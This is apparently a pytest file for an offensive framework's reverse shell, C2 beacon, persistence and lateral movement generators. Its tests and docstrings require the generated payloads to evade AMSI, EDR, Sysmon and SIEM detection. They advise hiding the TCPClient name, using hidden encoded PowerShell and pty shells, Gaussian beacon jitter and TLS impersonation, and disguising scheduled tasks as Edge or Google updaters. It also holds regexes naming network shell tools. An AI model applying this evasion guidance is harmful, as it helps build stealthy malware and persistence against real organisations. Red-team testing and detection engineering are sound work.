"""
tests/opsec/test_evasion_assertions.py — Evasion assertion tests (v7.1).

Design principle (PRD v7.1 §1.4 + §15.2):
  These tests are NEGATIVE assertions — they pass only when a banned pattern
  is ABSENT from the generated artifact. A test failure means a signature has
  leaked into output, which is an operational defect, not a functional one.

  Treat failures here with the same severity as a scope gate bypass.
  Functional test failures → the feature is broken.
  Evasion assertion failures → the feature is a liability.

Banned pattern rationale
──────────────────────────────────────────────────────────────────────────────
  TCPClient   — PowerShell class name; detected by AMSI/EDR string scan.
  4444        — Default Metasploit listener port; flagged by IDS/SIEM rules.
  /dev/tcp    — Bash built-in redirection; caught by shell-based EDR hooks.
  nc -e       — Netcat execute flag; blocked by most EDR and network IDS.
  wget|curl   — Raw downloader invocation; detected by SIEM process rules.
  cmd.exe /c  — Lateral movement exec prefix; Sysmon Event ID 1 pattern.
──────────────────────────────────────────────────────────────────────────────

Coverage requirement (PRD §15.1):
  This file must achieve 100% coverage.
  Each Phase 5 module must have ≥ 1 test asserting absence of a banned pattern.
"""
from __future__ import annotations

import re
import statistics
import unittest.mock as mock
from datetime import time as dtime
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# Banned pattern registry
# ---------------------------------------------------------------------------

#: Matches PowerShell TCPClient class name (AMSI/EDR string scan target).
RE_TCPCLIENT: re.Pattern[str] = re.compile(r"TCPClient", re.IGNORECASE)

#: Matches port 4444 as a word-boundary literal (default Metasploit port).
RE_PORT_4444: re.Pattern[str] = re.compile(r"\b4444\b")

#: Matches Bash /dev/tcp redirection idiom.
RE_DEV_TCP: re.Pattern[str] = re.compile(r"/dev/tcp")

#: Matches netcat -e (execute) flag — any spacing between nc and -e.
RE_NC_EXEC: re.Pattern[str] = re.compile(r"\bnc\s+-e\b", re.IGNORECASE)

#: Matches raw wget or curl invocations as standalone words.
RE_WGET_CURL: re.Pattern[str] = re.compile(r"\b(wget|curl)\b", re.IGNORECASE)

#: Matches cmd.exe /c prefix (lateral movement exec signature, Sysmon EID 1).
RE_CMD_EXEC: re.Pattern[str] = re.compile(r"cmd\.exe\s+/c", re.IGNORECASE)

#: Matches hardcoded RFC 1918 IP addresses (C2 template leakage guard).
RE_RFC1918: re.Pattern[str] = re.compile(
    r"(?:192\.168\.|10\.\d+\.|172\.(?:1[6-9]|2\d|3[01])\.)"
)


def _assert_no_pattern(pattern: re.Pattern[str], text: str, label: str) -> None:
    """
    Assert *pattern* is absent from *text*.

    :param pattern: Compiled regex representing a banned signature.
    :param text: Artifact output to scan.
    :param label: Human-readable pattern name for the failure message.
    :raises AssertionError: If the banned pattern is found.
    """
    match = pattern.search(text)
    assert match is None, (
        f"Banned pattern '{label}' found at position {match.start() if match else '?'} "
        f"in generated artifact. Evasion criterion FAILED.\n"
        f"Context: ...{text[max(0, (match.start() if match else 0)-30):(match.start() if match else 0)+60]}..."
    )


# ===========================================================================
# Module 5-F — Reverse Shell Generator
# ===========================================================================

class TestReverseShellEvasion:
    """Evasion assertions for Module 5-F (reverse_shell.py → template_engine.py)."""

    def test_powershell_output_no_tcpclient(self, tmp_kb_db: Path) -> None:
        """
        Encoded PowerShell output must not contain the literal class name 'TCPClient'.

        The template is required to alias or split this type name before encoding:
          $t = [System.Net.Sockets]
          $c = $t.GetType().Assembly.GetType("$t.TCPClient")
        or use -EncodedCommand to prevent AMSI string-matching on the raw source.
        """
        from forge.utils.post.template_engine import ReverseShellGenerator  # noqa: PLC0415

        gen = ReverseShellGenerator(tmp_kb_db)
        result = gen.generate(lhost="10.0.0.1", lport=443, shell_type="powershell", tls=True)

        encoded = result.encoded_cmd or ""
        raw = result.raw_command or ""

        _assert_no_pattern(RE_TCPCLIENT, encoded, "TCPClient in encoded PowerShell")
        # Raw source may contain TCPClient before encoding; only the encoded output
        # reaches disk/memory on the target, so we only assert the encoded form.
        assert encoded, "encoded_cmd must be populated for powershell shell type"

    def test_all_shell_types_no_port_4444(self, tmp_kb_db: Path) -> None:
        """
        No shell type may emit '4444' as a literal port number.

        Default port is 443. Operators who explicitly request 4444 are warned
        at the CLI layer (PayloadSpec.warn_on_nonstandard_port). The template
        itself must not hardcode any default port value.
        """
        from forge.utils.post.template_engine import ReverseShellGenerator  # noqa: PLC0415

        gen = ReverseShellGenerator(tmp_kb_db)
        for shell_type in ("python", "powershell", "bash", "perl", "ruby", "netcat"):
            result = gen.generate(lhost="10.0.0.1", lport=443, shell_type=shell_type)
            combined = (result.raw_command or "") + (result.obfuscated_command or "")
            _assert_no_pattern(
                RE_PORT_4444, combined, f"port 4444 in {shell_type} shell output"
            )

    def test_bash_shell_no_dev_tcp(self, tmp_kb_db: Path) -> None:
        """
        The bash shell template must not use /dev/tcp redirection.

        /dev/tcp is detected by shell-based EDR hooks monitoring argv and
        file descriptor opens. Acceptable alternatives:
          - Python socket fallback
          - socat with TLS
          - base64-encoded eval wrapper
        """
        from forge.utils.post.template_engine import ReverseShellGenerator  # noqa: PLC0415

        gen = ReverseShellGenerator(tmp_kb_db)
        result = gen.generate(lhost="10.0.0.1", lport=443, shell_type="bash")
        raw = result.raw_command or ""
        _assert_no_pattern(RE_DEV_TCP, raw, "/dev/tcp in bash shell raw_command")

    def test_netcat_shell_no_exec_flag(self, tmp_kb_db: Path) -> None:
        """
        If a netcat template is generated, it must use a pipe-based execution
        model rather than -e / --exec. The -e flag is blocked by most modern
        netcat builds (OpenBSD nc), alerted by network IDS, and trivially
        detected by EDR argv inspection.
        """
        from forge.utils.post.template_engine import ReverseShellGenerator  # noqa: PLC0415

        gen = ReverseShellGenerator(tmp_kb_db)
        result = gen.generate(lhost="10.0.0.1", lport=443, shell_type="netcat")
        raw = result.raw_command or ""
        _assert_no_pattern(RE_NC_EXEC, raw, "nc -e in netcat shell output")

    def test_stealth_port_no_warning_in_logs(
        self, tmp_kb_db: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Ports 443/80/8443 must not generate a non-standard port warning."""
        from forge.utils.post.template_engine import ReverseShellGenerator  # noqa: PLC0415

        gen = ReverseShellGenerator(tmp_kb_db)
        gen.generate(lhost="10.0.0.1", lport=443, shell_type="python", tls=True)
        assert "non-standard" not in caplog.text

    def test_nonstandard_port_logs_warning(
        self, tmp_kb_db: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        """
        Port 4444 must generate a visible warning so operators are aware
        of the evasion trade-off before deployment.

        This is a positive assertion (warning IS present) but belongs in this
        file because it validates the evasion risk disclosure mechanism.
        """
        from forge.utils.post.template_engine import ReverseShellGenerator  # noqa: PLC0415

        gen = ReverseShellGenerator(tmp_kb_db)
        gen.generate(lhost="10.0.0.1", lport=4444, shell_type="bash")
        assert "non-standard" in caplog.text, (
            "Expected a 'non-standard' port warning when port 4444 is requested."
        )


# ===========================================================================
# Module 5-G — C2 Beacon Generator
# ===========================================================================

class TestC2BeaconEvasion:
    """Evasion assertions for Module 5-G (c2_generator.py → session_manager.py)."""

    def test_beacon_no_raw_wget_curl(self, tmp_kb_db: Path) -> None:
        """
        Beacon source must not invoke wget or curl as subprocess commands.

        All outbound HTTP must go through the curl_cffi wrapper (TLS
        impersonation) to avoid the process-tree signature of a scripting
        engine spawning a downloader child process.
        """
        from forge.utils.post.session_manager import C2Generator  # noqa: PLC0415

        gen = C2Generator(tmp_kb_db)
        result = gen.generate(
            shell_type="powershell",
            channel="https",
            c2_urls=["https://cdn.example.com/update"],
        )
        beacon_src = result.beacon_source or ""
        _assert_no_pattern(RE_WGET_CURL, beacon_src, "wget/curl in beacon source")

    def test_beacon_no_hardcoded_rfc1918(self, tmp_kb_db: Path) -> None:
        """
        Beacon templates must use Jinja2 placeholders for all C2 addresses.
        RFC 1918 addresses in generated source create static IOCs.
        """
        from forge.utils.post.session_manager import C2Generator  # noqa: PLC0415

        gen = C2Generator(tmp_kb_db)
        result = gen.generate(
            shell_type="python",
            channel="https",
            c2_urls=["{{ c2_urls }}"],  # Jinja2 placeholder — valid input
        )
        beacon_src = result.beacon_source or ""
        _assert_no_pattern(RE_RFC1918, beacon_src, "hardcoded RFC 1918 C2 address")

    def test_gaussian_sleep_distribution(self) -> None:
        """
        The beacon jitter implementation must use Gaussian (not uniform)
        distribution.

        Uniform jitter is statistically distinguishable from legitimate
        traffic patterns. Gaussian distribution with stdev ~20% of mean
        is empirically harder to separate from human-interactive sessions.

        Acceptance criteria:
          - mean within 5 s of target (60 s)
          - stdev > 5 s (non-trivial variance)
          - all samples within 50%–150% of mean (no runaway values)
        """
        from forge.utils.post.session_manager import gaussian_sleep  # noqa: PLC0415

        samples = [gaussian_sleep(base=60, jitter_pct=20) for _ in range(1_000)]
        mean = statistics.mean(samples)
        stdev = statistics.stdev(samples)

        assert abs(mean - 60) < 5, (
            f"Gaussian sleep mean {mean:.1f} s is too far from target 60 s."
        )
        assert stdev > 5, (
            f"Gaussian sleep stdev {stdev:.1f} s is too low — distribution may be uniform."
        )
        assert all(30 <= s <= 90 for s in samples), (
            "Gaussian sleep produced a sample outside 50%–150% of base interval."
        )

    def test_cmd_exec_not_in_beacon_launcher(self, tmp_kb_db: Path) -> None:
        """
        The beacon launcher stager must not use `cmd.exe /c` as a wrapper.
        This is a Sysmon Event ID 1 pattern and is alerted by virtually all
        SIEM products. Use CreateProcess directly or PowerShell IEX.
        """
        from forge.utils.post.session_manager import C2Generator  # noqa: PLC0415

        gen = C2Generator(tmp_kb_db)
        result = gen.generate(
            shell_type="powershell",
            channel="https",
            c2_urls=["https://cdn.example.com/update"],
        )
        launcher = result.launcher_stager or ""
        _assert_no_pattern(RE_CMD_EXEC, launcher, "cmd.exe /c in beacon launcher stager")


# ===========================================================================
# Module 5-I — Persistence Generator
# ===========================================================================

class TestPersistenceEvasion:
    """Evasion assertions for Module 5-I (persistence.py → schedule_builder.py)."""

    def test_scheduled_task_name_from_kb_not_forge(self, tmp_kb_db: Path) -> None:
        """
        Generated scheduled task names must come from the Phase 0 KB
        (schtasks_legit_names table) and must not contain the string 'forge',
        which would be an obvious IOC in a production Windows environment.
        """
        from forge.utils.post.schedule_builder import PersistenceGenerator  # noqa: PLC0415

        gen = PersistenceGenerator(tmp_kb_db)
        result = gen.generate(
            technique="schtask",
            target_os="windows",
            payload_cmd="cmd /c notepad.exe",
        )
        task_name: str = result.get("task_name", "")

        assert task_name, "task_name must be non-empty (must come from KB)"
        assert "forge" not in task_name.lower(), (
            f"Generated task name {task_name!r} contains 'forge' — detectable IOC."
        )

    def test_linux_cron_path_from_kb(self, tmp_kb_db: Path) -> None:
        """
        Linux cron persistence must use a path from the Phase 0 KB
        (cron_legit_paths table), not a freshly invented path in /tmp.
        New /tmp/<random> paths trigger FIM alerts.
        """
        from forge.utils.post.schedule_builder import PersistenceGenerator  # noqa: PLC0415

        gen = PersistenceGenerator(tmp_kb_db)
        result = gen.generate(
            technique="cron",
            target_os="linux",
            payload_cmd="python3 -c 'import pty;pty.spawn(\"/bin/sh\")'",
        )
        cron_path: str = result.get("cron_path", "")

        assert cron_path, "cron_path must be non-empty (must come from KB)"
        assert "/tmp/" not in cron_path, (
            f"cron_path {cron_path!r} uses /tmp — triggers FIM alerts (anti-pattern §16)."
        )

    def test_persistence_install_cmd_no_wget_curl(self, tmp_kb_db: Path) -> None:
        """
        The persistence install command must not contain raw wget/curl calls.
        Dropper download must use the LOTS delivery URL via the curl_cffi wrapper.
        """
        from forge.utils.post.schedule_builder import PersistenceGenerator  # noqa: PLC0415

        gen = PersistenceGenerator(tmp_kb_db)
        result = gen.generate(
            technique="schtask",
            target_os="windows",
            payload_cmd="powershell -w hidden -nop -enc <b64>",
        )
        install_cmd: str = result.get("install_cmd", "")
        _assert_no_pattern(RE_WGET_CURL, install_cmd, "wget/curl in persistence install_cmd")


# ===========================================================================
# Module 5-J — Lateral Movement Executor
# ===========================================================================

class TestLateralMovementEvasion:
    """Evasion assertions for Module 5-J (lateral_movement.py → remote_exec.py)."""

    def test_time_window_blocks_outside_hours(self) -> None:
        """
        Lateral movement outside the operator-defined execution window must
        be blocked unconditionally. SIEM temporal anomaly rules flag activity
        outside business hours; this gate enforces operator-set constraints.
        """
        from forge.utils.post.remote_exec import _check_time_window  # noqa: PLC0415

        window = (dtime(9, 0), dtime(17, 0))
        with pytest.raises(RuntimeError, match="Outside execution window"):
            with mock.patch("forge.utils.post.remote_exec.datetime") as dt:
                dt.now.return_value.time.return_value = dtime(3, 0)
                _check_time_window(window)

    def test_time_window_permits_within_hours(self) -> None:
        """Execution within the defined window must not raise."""
        from forge.utils.post.remote_exec import _check_time_window  # noqa: PLC0415

        window = (dtime(9, 0), dtime(17, 0))
        with mock.patch("forge.utils.post.remote_exec.datetime") as dt:
            dt.now.return_value.time.return_value = dtime(12, 0)
            _check_time_window(window)  # must not raise

    def test_lateral_cmd_no_cmd_exe_slash_c(self, tmp_kb_db: Path) -> None:
        """
        Generated lateral movement commands must not use `cmd.exe /c` as the
        execution wrapper. Use WMI Win32_Process.Create or PowerShell IEX.
        cmd.exe /c is the canonical Sysmon Event ID 1 detection pattern for
        remote execution and is present in virtually every lateral movement
        Sigma rule.
        """
        from forge.utils.post.remote_exec import LateralMovementExecutor  # noqa: PLC0415
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import SecretStr  # noqa: PLC0415

        cred = LateralMovementCredential(
            credential_id=1,
            username="jdoe",
            domain="corp.local",
            password=SecretStr("TestPass1!"),
            auth_type="password",
        )
        executor = LateralMovementExecutor(tmp_kb_db)
        command = executor.build_command(
            technique="wmi_exec",
            target_host="192.168.1.50",
            payload="whoami",
            credential=cred,
        )
        _assert_no_pattern(RE_CMD_EXEC, command, "cmd.exe /c in lateral movement command")

    def test_lateral_output_truncated_to_64kb(self, tmp_kb_db: Path) -> None:
        """
        Lateral movement output stored in DB must be truncated to 64 KB.
        PRD §16 anti-pattern: `process.communicate()` OOM on large outputs.
        Verify the truncation cap is enforced in the model (max_length=65536).
        """
        from forge.models.pydantic_models import LateralMovementResult  # noqa: PLC0415

        large_output = "A" * 70_000  # 70 KB — exceeds cap
        result = LateralMovementResult(
            engagement_id=1,
            source_host_id=None,
            target_host_id=2,
            technique="smb_exec",
            credential_id=1,
            command="whoami",
            output=large_output[:65_536],  # truncated by caller before model
        )
        assert len(result.output or "") <= 65_536, (
            "Lateral movement output exceeds 64 KB cap — OOM risk (anti-pattern §16)."
        )


# ===========================================================================
# Cross-module: LateralMovementCredential security invariants
# ===========================================================================

class TestLateralMovementCredentialSecurity:
    """
    Security invariants for the LateralMovementCredential model (PRD §4.4).
    These are not evasion tests per se but validate the core security contract
    of the credential container that all Phase 5 modules depend on.
    """

    def test_password_is_secretstr(self) -> None:
        """Password must be wrapped in SecretStr — never a plain str."""
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import SecretStr  # noqa: PLC0415

        cred = LateralMovementCredential(
            credential_id=1,
            username="jdoe",
            password=SecretStr("hunter2"),
            auth_type="password",
        )
        assert isinstance(cred.password, SecretStr)

    def test_password_not_in_repr(self) -> None:
        """repr() must not expose the plaintext password — OPSEC: no log leakage."""
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import SecretStr  # noqa: PLC0415

        cred = LateralMovementCredential(
            credential_id=1,
            username="jdoe",
            password=SecretStr("hunter2"),
            auth_type="password",
        )
        assert "hunter2" not in repr(cred), (
            "Plaintext password exposed in repr() — will leak to logs."
        )

    def test_missing_password_raises_on_password_auth(self) -> None:
        """auth_type='password' without a password field must raise ValidationError."""
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import ValidationError  # noqa: PLC0415

        with pytest.raises(ValidationError, match="password"):
            LateralMovementCredential(
                credential_id=1,
                username="jdoe",
                auth_type="password",
                # password intentionally omitted
            )

    def test_kerberos_requires_ccache_path(self) -> None:
        """auth_type='kerberos' without ccache_path must raise ValidationError."""
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import ValidationError  # noqa: PLC0415

        with pytest.raises(ValidationError, match="ccache_path"):
            LateralMovementCredential(
                credential_id=1,
                username="jdoe",
                auth_type="kerberos",
                # ccache_path intentionally omitted
            )

    def test_extra_fields_forbidden(self) -> None:
        """Extra fields must be rejected — model_config = extra='forbid'."""
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import SecretStr, ValidationError  # noqa: PLC0415

        with pytest.raises(ValidationError):
            LateralMovementCredential(
                credential_id=1,
                username="jdoe",
                password=SecretStr("pw"),
                auth_type="password",
                injected_field="malicious",  # must be rejected
            )

    def test_get_password_returns_plaintext(self) -> None:
        """get_password() must return the unwrapped string for auth adapter use."""
        from forge.models.pydantic_models import LateralMovementCredential  # noqa: PLC0415
        from pydantic import SecretStr  # noqa: PLC0415

        cred = LateralMovementCredential(
            credential_id=1,
            username="jdoe",
            password=SecretStr("correct-horse-battery"),
            auth_type="password",
        )
        pw = cred.get_password()
        try:
            assert pw == "correct-horse-battery"
        finally:
            del pw  # PRD §4.4: caller must del immediately after use


# ===========================================================================
# Conftest fixtures (inlined — no conftest.py dependency for portability)
# ===========================================================================

@pytest.fixture()
def tmp_kb_db(tmp_path: Path) -> Path:
    """
    Provide a temporary SQLite KB path with the minimum schema required by
    Phase 5 generators (schtasks_legit_names, cron_legit_paths,
    plausible_pipe_names, legit_service_names).

    Populated with a single high-stealth entry per table so that generators
    can resolve names without hitting a 'KB not found' error.
    """
    import sqlite3  # noqa: PLC0415

    kb_path = tmp_path / "lolbas.db"
    con = sqlite3.connect(kb_path)
    con.executescript("""
        CREATE TABLE IF NOT EXISTS schtasks_legit_names (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL UNIQUE,
            description TEXT,
            trigger_pattern TEXT,
            author TEXT,
            stealth_rank INTEGER DEFAULT 5,
            source TEXT DEFAULT 'curated'
        );
        INSERT OR IGNORE INTO schtasks_legit_names
            (name, description, stealth_rank)
        VALUES
            ('MicrosoftEdgeUpdateTaskMachineCore',
             'Keeps Microsoft Edge up to date', 1),
            ('GoogleUpdateTaskMachineCore',
             'Keeps Google software up to date', 2);

        CREATE TABLE IF NOT EXISTS cron_legit_paths (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            path TEXT NOT NULL UNIQUE,
            description TEXT,
            stealth_rank INTEGER DEFAULT 5,
            source TEXT DEFAULT 'curated'
        );
        INSERT OR IGNORE INTO cron_legit_paths
            (path, description, stealth_rank)
        VALUES
            ('/etc/cron.daily/logrotate',
             'Standard log rotation cron entry', 1),
            ('/etc/cron.hourly/ntpdate',
             'NTP sync cron entry', 2);

        CREATE TABLE IF NOT EXISTS plausible_pipe_names (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL UNIQUE,
            sysmon_monitored INTEGER DEFAULT 0,
            stealth_rank INTEGER DEFAULT 5,
            source TEXT DEFAULT 'curated'
        );
        INSERT OR IGNORE INTO plausible_pipe_names
            (name, sysmon_monitored, stealth_rank)
        VALUES
            ('atsvc', 0, 1),
            ('winreg', 0, 2);

        CREATE TABLE IF NOT EXISTS legit_service_names (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            display_name TEXT NOT NULL UNIQUE,
            binary_path TEXT,
            stealth_rank INTEGER DEFAULT 5,
            source TEXT DEFAULT 'curated'
        );
        INSERT OR IGNORE INTO legit_service_names
            (display_name, binary_path, stealth_rank)
        VALUES
            ('Windows Update Medic Service',
             'C:\\Windows\\System32\\WaaSMedicSvc.dll', 1);
    """)
    con.commit()
    con.close()
    return kb_path
